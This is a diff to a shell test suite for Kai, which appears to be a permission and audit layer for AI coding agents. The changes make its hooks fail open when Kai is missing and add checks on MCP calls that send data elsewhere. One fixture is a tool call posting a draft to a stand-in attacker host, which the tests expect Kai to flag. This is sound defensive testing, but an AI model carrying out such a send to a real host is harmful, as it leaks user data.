@@ -81,7 +81,7 @@ k allow-upload notes.txt --to up.example.net --agent claude --for 1h >/dev/null
 has "...not the same file piped elsewhere" "$(hk claude "$uppipe")" "deny"
 
 o=$(hk claude "$mcp")
-has "MCP without the app: no pointing at a missing app" "$o" "kai allow-mcp notion create_page --agent claude --for 1h"
+[ -z "$o" ] && pass "C2: an MCP edit from a configured server is left to Claude Code (no Kai decision)" || fail "MCP edit got a Kai decision: $o"
 k allow-mcp notion create_page --agent claude --for 1h >/dev/null
 [ -z "$(hk claude "$mcp")" ] && pass "after allow-mcp, that tool goes through" || fail "mcp still stopped"
 
@@ -97,9 +97,26 @@ o=$(hk claude "$wpread")
 [ -z "$o" ] && pass "Step 7: an MCP read tool (get_page_blocks) goes through with zero Kai prompts" || fail "MCP read prompted: $o"
 grep -q '"rule":"mcp:wp/get_page_blocks"' "$KAI_HOME/audit.log" 2>/dev/null && pass "...and is recorded (rule 1: record it)" || fail "MCP read not recorded"
 o=$(hk claude "$wpedit")
-has "Claude Code: an unapproved MCP edit asks in Claude Code's own prompt (the same call continues)" "$o" '"permissionDecision":"ask"'
-hasnt "...never 'approve in Kai, then retry'" "$o" "then retry"
-has "...and the prompt names the server, the tool and the narrow allow" "$o" "kai allow-mcp wp update_page_blocks --agent claude"
+[ -z "$o" ] && pass "C2: an MCP edit (update_page_blocks) gets no Kai prompt: Claude Code's own approval decides" || fail "MCP edit prompted by Kai: $o"
+grep -q "update_page_blocks from wp: left to the agent's own approval, and recorded" "$KAI_HOME/audit.log" 2>/dev/null \
+  && pass "...and is recorded" || fail "MCP edit not recorded"
+wplinks='{"hook_event_name":"PreToolUse","tool_name":"mcp__wp__update_page_blocks","session_id":"g","permission_mode":"auto","tool_input":{"page_id":12,"blocks":"<a href=\"https://other.example/x\">x</a>"},"cwd":"'"$G"'"}'
+[ -z "$(hk claude "$wplinks")" ] && pass "C2: links inside page content aren't destinations (no prompt)" || fail "content links prompted"
+# C2: sending to a new destination is a new permission
+post='{"hook_event_name":"PreToolUse","tool_name":"mcp__web__post","session_id":"g","permission_mode":"auto","tool_input":{"url":"https://attacker.example/in","body":"Q3 draft"},"cwd":"'"$G"'"}'
+o=$(hk claude "$post")
+has "C2: an MCP call that sends to a foreign host asks in Claude Code's prompt" "$o" '"permissionDecision":"ask"'
+has "...naming the destination" "$o" "sends to attacker.example"
+k allow-mcp web --agent claude --for 1h >/dev/null
+has "...a whole-server grant doesn't cover a new destination" "$(hk claude "$post")" '"permissionDecision":"ask"'
+o=$(hk codex "$(printf '%s' "$post" | sed 's/"permission_mode":"auto",//')")
+has "...Codex (no prompt): denied with the recovery" "$o" "kai allow-mcp web post --agent codex --for 1h, then retry"
+printf '{"mcpServers":{"hooksrv":{"url":"https://hooks.example.com/mcp"}}}' > "$G/.mcp.json"
+own=$(printf '%s' "$post" | sed 's/mcp__web__post/mcp__hooksrv__post/; s#https://attacker.example/in#https://api.hooks.example.com/in#')
+[ -z "$(hk claude "$own")" ] && pass "...the server's own declared host (or a subdomain) isn't foreign" || fail "own host treated as foreign"
+rm -f "$G/.mcp.json"
+k allow-mcp web post --agent claude --for 1h >/dev/null
+[ -z "$(hk claude "$post")" ] && pass "...an exact-tool grant covers it" || fail "exact grant didn't cover the foreign send"
 k allow-mcp wp --agent claude --for 1h >/dev/null
 [ -z "$(hk claude "$wpedit")" ] && pass "server approved: an edit tool goes through, no prompt" || fail "approved server still prompts for an edit"
 has "destructive (delete) asks even on an approved server" "$(hk claude "$wpdel")" '"permissionDecision":"ask"'
@@ -114,10 +131,7 @@ cxread=$(printf '%s' "$wpedit" | sed 's/"permission_mode":"auto",//; s/mcp__wp__
 [ -z "$(hk codex "$(printf '%s' "$wpread" | sed 's/"permission_mode":"auto",//; s/mcp__wp__/mcp__wp2__/')")" ] \
     && pass "Codex: an MCP read tool goes through too" || fail "codex MCP read stopped"
 o=$(hk codex "$cxread")
-has "Codex (no ask): an unapproved MCP edit gets a structured deny" "$o" '"permissionDecision":"deny"'
-has "...naming what Kai stopped" "$o" "Kai stopped the MCP tool update_page_blocks from wp2"
-has "...and the exact recovery" "$o" "kai allow-mcp wp2 --agent codex --for 1h, then retry"
-has "...so the agent asks instead of ending its turn" "$o" "ask the user"
+[ -z "$o" ] && pass "C2: Codex, an MCP edit goes through (recorded); Codex's own approvals apply" || fail "codex MCP edit stopped: $o"
 cxdel=$(printf '%s' "$wpdel" | sed 's/"permission_mode":"auto",//')
 k allow-mcp wp --agent codex --for 1h >/dev/null
 o=$(hk codex "$cxdel")
@@ -539,10 +553,10 @@ sys.exit(0 if b < s*2 + 0.005 else 1)" \
   && pass "append time doesn't grow with the log" || fail "append slows down as the log grows"
 mv "$KAI_HOME/audit.log" "$KAI_HOME/audit.log.junk"
 
-# Run each of Kai's installed hook commands with Kai's program gone. Blocking
-# events must exit 2 (the agent then blocks) with a reason; Stop and
-# PostToolUse must not (exit 2 on Stop would keep the agent from stopping).
-fails_closed() {
+# C1: run each of Kai's installed hook commands with Kai's program gone. No
+# event may block the agent: no exit 2, and no fail-closed setting (Claude
+# Code onFailure, Cursor failClosed, the Codex exit-2 wrapper).
+never_blocks() {
     python3 -I - "$1" "$2" "$KAI" <<'PY'
 import json, subprocess, sys
 path, agent, kai = sys.argv[1:]
@@ -556,16 +570,10 @@ for event, groups in d["hooks"].items():
                 continue
             gone = cmd.replace(kai, "/nonexistent/kai")
             r = subprocess.run(["/bin/sh", "-c", gone], input="{}", capture_output=True, text=True)
-            tool = event == "PreToolUse"
-            # STEP 2c: tool hooks fail closed (Claude Code: onFailure block;
-            # Codex: the self-check, exit 2 with a reason); prompts and
-            # lifecycle hooks never block on Kai's own failure.
-            if tool and agent == "claude" and (h.get("onFailure") != "block" or r.returncode == 0):
-                bad.append(f"{event}: no onFailure block (exit {r.returncode})")
-            if tool and agent == "codex" and (r.returncode != 2 or "Kai couldn't check this" not in r.stderr):
-                bad.append(f"{event}: exit {r.returncode}")
-            if not tool and r.returncode == 2:
-                bad.append(f"{event}: a missing Kai would block it")
+            if "onFailure" in h or h.get("failClosed") or "exit 2" in cmd:
+                bad.append(f"{event}: has a fail-closed setting")
+            if r.returncode == 2:
+                bad.append(f"{event}: a missing Kai would block it (exit 2)")
 print("ok" if not bad else "; ".join(bad))
 PY
 }
@@ -606,8 +614,8 @@ mkdir -p "$TMP/gone" && cp "$KAI" "$TMP/gone/kai"
 "$TMP/gone/kai" install claude >/dev/null
 rm "$TMP/gone/kai"
 has "status: missing kai program is a problem" "$(claude_health)" "False Kai's program is missing"
-has "status: says the agent is blocked meanwhile" "$(claude_health)" 'blocked until Kai is reinstalled'
-# An old-style hook (no fail-closed guard) answers but is flagged.
+has "status: says checks are off and settings aren't protected" "$(claude_health)" "its settings aren't protected"
+# C1: a hook from an earlier Kai (fail-closed guard) answers but is flagged: it would stop the agent.
 python3 -I - "$HOME/.claude/settings.json" "$KAI" <<'PY'
 import json, sys
 p, kai = sys.argv[1:]
@@ -617,13 +625,14 @@ for groups in d["hooks"].values():
         for h in g.get("hooks", []):
             if " hook claude" in h.get("command", ""):
                 h["command"] = kai + " hook claude"
-                h.pop("onFailure", None)          # an older Kai: no fail-closed setting
+                if g.get("matcher") is not None:
+                    h["onFailure"] = "block"     # an earlier Kai: tool hooks fail closed
 json.dump(d, open(p, "w"))
 PY
-has "status: unguarded hooks are flagged" "$(claude_health)" 'older Kai'
+has "status: fail-closed hooks from an earlier Kai are flagged" "$(claude_health)" 'earlier Kai'
 "$KAI" install claude >/dev/null
 has "status: reinstall fixes it" "$(claude_health)" 'True'
-has "claude tool hooks fail closed when Kai is missing; prompts and Stop don't" "$(fails_closed "$HOME/.claude/settings.json" claude)" 'ok'
+has "no claude hook blocks the agent when Kai is missing" "$(never_blocks "$HOME/.claude/settings.json" claude)" 'ok'
 "$KAI" uninstall claude >/dev/null
 s=$(cat "$HOME/.claude/settings.json")
 hasnt "uninstall removes kai hooks" "$s" 'hook claude'
@@ -642,7 +651,7 @@ env -u KAI_TEST_ALLOW_DEV_HOOK "$SD/kai" install claude >/dev/null 2>&1 && pass 
 SDR=$(cd "$SD" && pwd -P)
 has "...the path is quoted in the hook command" "$(cat "$HOME/.claude/settings.json")" "'$SDR/kai' hook claude"
 has "...and the hooks answer (health)" "$(claude_health)" 'True'
-# b. per event: tool hooks fail closed, prompts and lifecycle never brick
+# b. per event: no hook fails closed (C1)
 python3 -I - "$HOME/.claude/settings.json" <<'PY' > "$TMP/claude-events.txt"
 import json, sys
 d = json.load(open(sys.argv[1]))
@@ -652,14 +661,15 @@ for ev, groups in d["hooks"].items():
             if " hook claude" in h.get("command", ""):
                 print(ev, h.get("onFailure", "-"), "wrapper" if "exit 2" in h["command"] else "plain")
 PY
-has "Claude Code PreToolUse: onFailure block" "$(cat "$TMP/claude-events.txt")" "PreToolUse block plain"
+has "Claude Code PreToolUse: no onFailure" "$(cat "$TMP/claude-events.txt")" "PreToolUse - plain"
+hasnt "no Claude Code hook has onFailure block" "$(cat "$TMP/claude-events.txt")" " block "
 has "UserPromptSubmit: no onFailure, no exit-2 wrapper" "$(cat "$TMP/claude-events.txt")" "UserPromptSubmit - plain"
 hasnt "no Kai hook uses the exit-2 wrapper" "$(cat "$TMP/claude-events.txt")" "wrapper"
 rm "$SD/kai"
 o=$(printf '%s' '{"hook_event_name":"UserPromptSubmit","session_id":"s","prompt":"hi","cwd":"/tmp"}' | sh -c "'$SD/kai' hook claude" 2>&1); rc=$?
 [ $rc -ne 2 ] && pass "kai missing: the prompt hook doesn't exit 2 (the prompt reaches the agent)" || fail "prompt hook exits 2 with kai missing"
 printf '%s' '{}' | sh -c "'$SD/kai' hook claude" >/dev/null 2>&1; rc=$?
-[ $rc -ne 0 ] && pass "kai missing: the tool hook fails (onFailure block stops the call)" || fail "tool hook succeeded with kai missing"
+[ $rc -ne 2 ] && pass "kai missing, no launcher: the tool hook doesn't exit 2 (Claude Code continues; no onFailure)" || fail "tool hook exits 2 with kai missing"
 has "status: the missing program is a problem, the agent blocked" "$(claude_health)" "Kai's program is missing"
 # c. repair from the CLI: kai doctor --fix rewrites the hooks to the running, stable kai
 SD2="$TMP/stable2"; mkdir -p "$SD2"; cp "$KAI" "$SD2/kai"
@@ -667,11 +677,16 @@ o=$(env -u KAI_TEST_ALLOW_DEV_HOOK "$SD2/kai" doctor --fix 2>&1)
 has "kai doctor --fix repairs Claude Code's hooks" "$o" "Repaired Claude Code"
 has "...now pointing at the running kai" "$(cat "$HOME/.claude/settings.json")" "'$(cd "$SD2" && pwd -P)/kai' hook claude"
 has "...and they answer" "$(claude_health)" 'True'
-# Claude Code older than 2.1.295 has no onFailure: say so
-mkdir -p "$TMP/oldclaude"; printf '#!/bin/sh\necho "2.1.200 (Claude Code)"\n' > "$TMP/oldclaude/claude"; chmod +x "$TMP/oldclaude/claude"
-o=$(PATH="$TMP/oldclaude:$PATH" env -u KAI_TEST_ALLOW_DEV_HOOK "$SD2/kai" install claude 2>&1)
-has "an older Claude Code: install warns tool checks may fail open" "$o" "tool checks may fail open if Kai is missing"
-# Cursor: failClosed on tool hooks only
+# C1: hooks never point into an app bundle (trashing the app would leave them calling a missing program)
+AB="$TMP/Kai.app/Contents/Resources"; mkdir -p "$AB"; cp "$KAI" "$AB/kai"
+before=$(cat "$HOME/.claude/settings.json")
+o=$(env -u KAI_TEST_ALLOW_DEV_HOOK "$AB/kai" install claude 2>&1); rc=$?
+[ $rc -eq 2 ] && pass "install from inside an app bundle refuses (exit 2)" || fail "app-bundle install: exit $rc"
+has "...and says to reinstall the package for the launcher" "$o" "Reinstall the Kai package"
+[ "$(cat "$HOME/.claude/settings.json")" = "$before" ] && pass "...and leaves the hooks as they were" || fail "app-bundle install changed the hooks"
+o=$(env -u KAI_TEST_ALLOW_DEV_HOOK "$AB/kai" doctor --fix 2>&1); rc=$?
+[ $rc -eq 2 ] && pass "repair from inside an app bundle refuses too" || fail "app-bundle repair: exit $rc"
+# Cursor: no failClosed on any hook (C1)
 mkdir -p "$HOME/.cursor"
 env -u KAI_TEST_ALLOW_DEV_HOOK "$SD2/kai" install cursor >/dev/null 2>&1
 python3 -I - "$HOME/.cursor/hooks.json" <<'PY' > "$TMP/cursor-events.txt"
@@ -682,27 +697,48 @@ for ev, entries in d["hooks"].items():
         if " hook cursor" in e.get("command", ""):
             print(ev, "failClosed" if e.get("failClosed") else "open")
 PY
-has "Cursor beforeShellExecution: failClosed" "$(cat "$TMP/cursor-events.txt")" "beforeShellExecution failClosed"
+has "Cursor beforeShellExecution: not failClosed (C1)" "$(cat "$TMP/cursor-events.txt")" "beforeShellExecution open"
+hasnt "no Cursor hook is failClosed" "$(cat "$TMP/cursor-events.txt")" "failClosed"
 has "Cursor beforeSubmitPrompt: not failClosed (prompts never brick)" "$(cat "$TMP/cursor-events.txt")" "beforeSubmitPrompt open"
 env -u KAI_TEST_ALLOW_DEV_HOOK "$SD2/kai" uninstall cursor >/dev/null 2>&1
 
-echo "== hook launcher (STEP 2c): kai missing never bricks the agent =="
+echo "== hook launcher (C1): kai missing never stops the agent, and claims nothing =="
 L="$TMP/kai-hook"
 sed "s#^K=.*#K='$TMP/nokai/kai'#" "$(dirname "$0")/../../scripts/release/kai-hook" > "$L"; chmod +x "$L"
-lo() { printf '%s' "$2" | "$L" hook "$1"; }
+LT="$TMP/launcher-tmp"; mkdir -p "$LT"
+lo() { printf '%s' "$2" | TMPDIR="$LT" "$L" hook "$1"; }
+rm -f "$KAI_HOME/unchecked.log"
+o=$(lo claude '{"hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":"cat SECRET-MARKER"}}'); rc=$?
+[ $rc -eq 0 ] && pass "launcher, kai missing: a Claude Code tool call exits 0" || fail "launcher tool exit $rc"
+hasnt "...with no decision (Claude Code's own permissions apply)" "$o" 'permissionDecision'
+has "...and a warning that Kai's settings aren't protected" "$o" "settings aren't protected"
+has "...that names Repair" "$o" "Repair"
+hasnt "...and never claims protection" "$o" "protected by"
+o=$(lo claude '{"hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":"ls"}}')
+[ -z "$o" ] && pass "launcher: the warning isn't repeated within 10 minutes" || fail "launcher repeated the warning [$o]"
+rm -f "$LT"/kai-hook-warned-*
 o=$(lo claude '{"hook_event_name":"UserPromptSubmit","prompt":"hi"}'); rc=$?
 [ $rc -eq 0 ] && pass "launcher, kai missing: a Claude Code prompt goes through (exit 0)" || fail "launcher prompt exit $rc"
-has "...with a warning that names Repair" "$o" "Repair"
-o=$(lo claude '{"hook_event_name":"PreToolUse","tool_name":"Bash","tool_input":{"command":"ls"}}')
-has "launcher, kai missing: a Claude Code tool call is denied" "$o" '"permissionDecision":"deny"'
-has "...with a message that names the Repair button" "$o" "Repair"
+has "...with the same warning" "$o" "settings aren't protected"
 o=$(lo claude '{"hook_event_name":"Stop"}'); rc=$?
 [ $rc -eq 0 ] && [ -z "$o" ] && pass "launcher, kai missing: Stop passes silently (never traps the session)" || fail "launcher Stop: exit $rc [$o]"
-has "launcher, kai missing: a Codex tool call is denied" "$(lo codex '{"hook_event_name":"PreToolUse","tool_name":"shell"}')" '"permissionDecision":"deny"'
-o=$(lo codex '{"hook_event_name":"UserPromptSubmit","prompt":"hi"}'); rc=$?
+o=$(lo codex '{"hook_event_name":"PreToolUse","tool_name":"shell"}' 2>/dev/null); rc=$?
+[ $rc -eq 0 ] && pass "launcher, kai missing: a Codex tool call exits 0" || fail "launcher codex tool exit $rc"
+hasnt "...with no decision" "$o" 'permissionDecision'
+o=$(lo codex '{"hook_event_name":"UserPromptSubmit","prompt":"hi"}' 2>/dev/null); rc=$?
 [ $rc -eq 0 ] && pass "launcher, kai missing: a Codex prompt goes through" || fail "launcher codex prompt exit $rc"
-has "launcher, kai missing: a Cursor shell command is denied" "$(lo cursor '{"hook_event_name":"beforeShellExecution","command":"ls"}')" '"permission":"deny"'
+o=$(lo cursor '{"hook_event_name":"beforeShellExecution","command":"ls"}')
+has "launcher, kai missing: a Cursor shell command goes to Cursor's own approval (ask)" "$o" '"permission":"ask"'
+hasnt "...never denied" "$o" '"deny"'
+has "launcher, kai missing: a Cursor file read is allowed" "$(lo cursor '{"hook_event_name":"beforeReadFile","file_path":"x"}')" '"permission":"allow"'
 has "launcher, kai missing: a Cursor prompt continues" "$(lo cursor '{"hook_event_name":"beforeSubmitPrompt","prompt":"hi"}')" '"continue":true'
+u=$(cat "$KAI_HOME/unchecked.log" 2>/dev/null)
+[ "$(printf '%s\n' "$u" | grep -c unchecked)" -ge 6 ] && pass "launcher counts each unchecked call in unchecked.log" || fail "unchecked.log: [$u]"
+hasnt "...without recording the input" "$u" "SECRET-MARKER"
+hasnt "...and Stop isn't counted" "$u" '"event":"other"'
+o=$(TMPDIR="$LT" "$L" --status)
+has "kai-hook --status says the program is missing and settings aren't protected" "$o" "settings aren't protected"
+has "...and how to repair" "$o" "click Repair"
 sed "s#^K=.*#K='$KAI'#" "$(dirname "$0")/../../scripts/release/kai-hook" > "$L"; chmod +x "$L"
 has "launcher with kai present: runs kai's own checks" \
   "$(printf '%s' '{"hook_event_name":"PreToolUse","tool_name":"Read","session_id":"l","tool_input":{"file_path":"'"$G"'/.env"},"cwd":"'"$G"'"}' | KAI_NO_APP=1 "$L" hook claude)" '"permissionDecision":"deny"'
@@ -739,7 +775,7 @@ printf '{"hooks":{"PreToolUse":[{"matcher":"Bash","hooks":[{"type":"command","co
 s=$(cat "$CODEX_HOME/hooks.json")
 [ "$(count "$s" 'hook codex')" = 3 ] && pass "install codex twice adds hooks once" || fail "codex hooks duplicated ($(count "$s" 'hook codex'))"
 hasnt "codex entries carry no _kai marker" "$s" '_kai'
-has "codex hooks fail closed when Kai is missing" "$(fails_closed "$CODEX_HOME/hooks.json" codex)" 'ok'
+has "no codex hook blocks the agent when Kai is missing" "$(never_blocks "$CODEX_HOME/hooks.json" codex)" 'ok'
 has "status: codex installed" "$(codex_installed)" "True"
 has "doctor reports codex" "$("$KAI" doctor)" 'Codex: hooks in'
 "$KAI" uninstall codex >/dev/null
